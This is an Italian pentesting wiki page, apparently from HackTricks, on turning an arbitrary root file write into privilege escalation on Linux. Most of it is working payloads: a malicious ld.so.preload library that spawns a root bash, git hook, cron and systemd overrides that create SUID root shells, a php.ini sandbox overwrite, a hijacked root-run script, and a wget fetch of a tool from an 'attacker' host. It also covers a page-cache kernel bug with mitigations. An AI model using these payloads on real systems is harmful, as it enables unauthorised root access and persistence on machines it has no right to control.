# Scrittura Arbitraria di File come Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Questo file si comporta come la variabile d'ambiente **`LD_PRELOAD`** ma funziona anche nei binary **SUID**.\
Se puoi crearlo o modificarlo, puoi semplicemente aggiungere un **path a una library che verrà caricata** con ogni binary eseguito.

Per esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** su vari **eventi** in un repository git, come quando viene creato un commit, un merge... Quindi, se uno **script o utente privilegiato** esegue frequentemente queste azioni ed è possibile **scrivere nella cartella `.git`**, questo può essere usato per **privesc**.

Per esempio, è possibile **generare uno script** in un repo git in **`.git/hooks`** così viene sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

Se puoi **scrivere file relativi a cron che root esegue**, di solito puoi ottenere code execution la prossima volta che il job viene eseguito. Tra i target interessanti ci sono:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Il crontab di root in `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- `systemd` timers e i servizi che attivano

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Percorsi di abuso tipici:

- **Aggiungere un nuovo cron job root** a `/etc/crontab` o a un file in `/etc/cron.d/`
- **Sostituire uno script** già eseguito da `run-parts`
- **Backdoorare un timer target esistente** modificando lo script o il binario che avvia

Esempio minimale di payload cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se puoi scrivere solo dentro una directory cron usata da `run-parts`, inserisci invece lì un file eseguibile:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Note:

- `run-parts` di solito ignora i filename che contengono punti, quindi preferisci nomi come `backup` invece di `backup.sh`.
- Alcune distro usano `anacron` o timer di `systemd` invece del classico cron, ma l'idea di abuso è la stessa: **modificare ciò che root eseguirà più tardi**.

### Service & Socket files

Se puoi scrivere **`systemd` unit files** o file da essi referenziati, potresti riuscire a ottenere code execution come root ricaricando e riavviando l'unit, oppure aspettando che si attivi il percorso di attivazione service/socket.

I target interessanti includono:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenziati da `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Percorsi `EnvironmentFile=` scrivibili caricati da un root service

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Percorsi di abuso comuni:

- **Sovrascrivere `ExecStart=`** in un unit service di proprietà di root che puoi modificare
- **Aggiungere un drop-in override** con un `ExecStart=` malevolo e prima cancellare quello vecchio
- **Backdoorare lo script/binario** già referenziato dall'unit
- **Hijackare un servizio attivato via socket** modificando il corrispondente file `.service` che si avvia quando il socket riceve una connessione

Esempio di override malevolo:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flusso di attivazione tipico:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se non puoi riavviare i servizi da solo ma puoi modificare un'unità socket-activated, potresti dover solo **attendere una connessione client** per attivare l'esecuzione del servizio backdoored come root.

### Sovrascrivere un `php.ini` restrittivo usato da un PHP sandbox con privilegi elevati

Alcuni daemon custom validano il PHP fornito dall'utente eseguendo `php` con un **`php.ini` ristretto** (per esempio, `disable_functions=exec,system,...`). Se il codice sandboxed ha ancora **qualsiasi write primitive** (come `file_put_contents`) e puoi raggiungere l'**esatto path di `php.ini`** usato dal daemon, puoi **sovrascrivere quella configurazione** per rimuovere le restrizioni e poi inviare un secondo payload che esegue codice con privilegi elevati.

Flusso tipico:

1. Il primo payload sovrascrive la configurazione della sandbox.
2. Il secondo payload esegue codice ora che le funzioni pericolose sono state riabilitate.

Esempio minimale (sostituisci il path usato dal daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se il daemon viene eseguito come root (o valida con path posseduti da root), la seconda esecuzione produce un contesto root. Questo è essenzialmente **privilege escalation via config overwrite** quando il runtime in sandbox può ancora scrivere file.

### binfmt_misc

Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binary deve eseguire quali tipi di file. TODO: verificare i requisiti per abusarne per eseguire una rev shell quando viene aperto un tipo di file comune.

### Overwrite schema handlers (like http: or https:)

Un attacker con permessi di scrittura nelle directory di configurazione della vittima può facilmente sostituire o creare file che cambiano il comportamento del sistema, causando code execution non prevista. Modificando il file `$HOME/.config/mimeapps.list` per puntare gli handler degli URL HTTP e HTTPS a un file malevolo (ad esempio impostando `x-scheme-handler/http=evil.desktop`), l'attacker fa sì che **cliccare qualsiasi link http o https attivi il codice specificato in quel file `evil.desktop`**. Per esempio, dopo aver inserito il seguente codice malevolo in `evil.desktop` in `$HOME/.local/share/applications`, qualsiasi click su un URL esterno esegue il comando incorporato:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Per ulteriori informazioni, controlla [**questo post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) in cui è stato usato per sfruttare una vulnerabilità reale.

### Root esegue script/binary scrivibili dall'utente

Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binary all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:

- **Rilevare l'esecuzione:** monitora i processi con [pspy](https://github.com/DominicBreuker/pspy) per intercettare root che invoca percorsi controllati dall'utente:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Conferma la scrivibilità:** assicurati che sia il file di destinazione sia la sua directory siano di tua proprietà/scrivibili dal tuo utente.
- **Hijack del target:** fai il backup del binario/script originale e inserisci un payload che crei una shell SUID (o qualsiasi altra azione root), poi ripristina i permessi:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (e.g., premere un pulsante UI che avvia l'helper). When root re-executes the hijacked path, grab the escalated shell with `./rootshell -p`.

### Modifica del file solo nella page cache di binari privilegiati

Some kernel bugs don't modify the file **on disk**. Instead, they let you modify only the **page cache copy** of a readable file. If you can target a **setuid** or otherwise **root-executed** binary, the next execution may run attacker-controlled bytes from memory and escalate privileges even though the file hash on disk is unchanged.

Questo è utile da considerare come una **runtime-only file write primitive**:

- **Disk stays clean**: l'inode e i byte su disco non cambiano
- **Memory is dirty**: i processi che leggono/eseguono la pagina in cache ottengono il contenuto modificato dall'attaccante
- **Effect is temporary**: la modifica scompare dopo il reboot o l'eviction della cache

Questa primitive si colloca tra il classico **arbitrary file write** e i vecchi bug di **page-cache abuse** come Dirty COW / Dirty Pipe:

- Dirty COW si basava su una race
- Dirty Pipe aveva vincoli sulla posizione di scrittura
- Una primitive solo sulla page cache può essere più affidabile se il percorso vulnerabile fornisce scritture dirette in pagine file-backed in cache

#### Generic privesc flow

1. Ottieni una kernel primitive che può scrivere in **file-backed page cache pages**
2. Usala contro un **readable privileged binary** o un altro file eseguito da root
3. Trigger l'esecuzione **prima** che la pagina venga evicted dalla cache
4. Ottieni code execution come root mentre il file su disco sembra ancora invariato

Target tipici di alto valore:

- binari **setuid-root**
- helper avviati da **root services**
- binari eseguiti comunemente da **containers sharing the host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) è un buon esempio di questa classe. Il percorso vulnerabile era nella Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` può spostare riferimenti a page-cache pages da un file leggibile nella crypto TX scatterlist
- il percorso di decrypt in-place di `algif_aead` riutilizzava i buffer sorgente e destinazione
- `authencesn` poi scriveva nella regione tag di destinazione
- quando quella regione referenziava ancora pagine file-backed spliced, la scrittura finiva nella **page cache del file target**

Quindi la tecnica interessante non è la CVE in sé, ma il pattern:

- **inviare pagine di cache file-backed in un kernel subsystem**
- far sì che il subsystem le **tratti come output scrivibile**
- trigger una piccola overwrite controllata in memoria

Il PoC pubblico usava scritture ripetute da **4 byte** per patchare `/usr/bin/su` in memoria e poi eseguirlo.

#### Exposure and hunting

Se sospetti questa classe di bug, non affidarti solo ai controlli di integrità su disco. Verifica anche:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` può essere caricabile/scaricabile come modulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: l'interfaccia è integrata nel kernel
- i binari setuid sono buoni target perché una patch solo sul page-cache può essere sufficiente per trasformare un foothold locale in root

#### Riduzione della attack-surface per il path `algif_aead`

Se l'interfaccia vulnerabile è fornita da un modulo caricabile:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se è compilato nel kernel, alcune disclosure hanno segnalato che si blocca il path di init con:
```bash
initcall_blacklist=algif_aead_init
```
Questo tipo di mitigazione vale la pena ricordarlo anche per altre LPE del kernel: se l’exploitation dipende da una specifica interfaccia opzionale, disabilitare o mettere in blacklist quella interfaccia può interrompere il percorso di exploit anche prima che sia disponibile un aggiornamento completo del kernel.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
